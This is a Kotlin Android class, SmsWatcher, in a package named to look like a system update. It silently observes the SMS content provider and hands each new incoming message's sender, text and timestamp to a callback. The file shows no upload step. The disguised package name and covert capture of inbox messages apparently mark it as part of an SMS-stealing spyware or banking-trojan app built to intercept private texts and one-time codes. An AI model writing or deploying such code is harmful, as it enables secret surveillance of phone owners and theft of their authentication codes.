package com.system.update

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.util.Log

class SmsWatcher(
    private val ctx: Context,
    private val onNewSms: (Map<String, String>) -> Unit
) {

    companion object {
        private const val TAG = "SmsWatcher"
    }

    private var observer: ContentObserver? = null

    fun start() {
        if (observer != null) return

        observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                if (uri == null) return
                if (uri.toString().contains("sms")) {
                    try {
                        val cursor = ctx.contentResolver.query(
                            uri, null, null, null, "date DESC LIMIT 1"
                        )
                        cursor?.use {
                            if (it.moveToFirst()) {
                                val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                                val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                                val date = it.getLong(it.getColumnIndexOrThrow("date"))
                                val type = it.getInt(it.getColumnIndexOrThrow("type"))

                                // type 1 = inbox, 2 = sent
                                if (type == 1) {
                                    onNewSms(mapOf(
                                        "app" to addr,
                                        "body" to body,
                                        "date" to date.toString(),
                                        "type" to "inbox"
                                    ))
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "read error", e)
                    }
                }
            }
        }

        try {
            ctx.contentResolver.registerContentObserver(
                Uri.parse("content://sms"),
                true,
                observer!!
            )
            Log.i(TAG, "SMS watcher started")
        } catch (e: Exception) {
            Log.e(TAG, "register error", e)
        }
    }

    fun stop() {
        try {
            observer?.let { ctx.contentResolver.unregisterContentObserver(it) }
        } catch (_: Exception) {}
        observer = null
    }
}
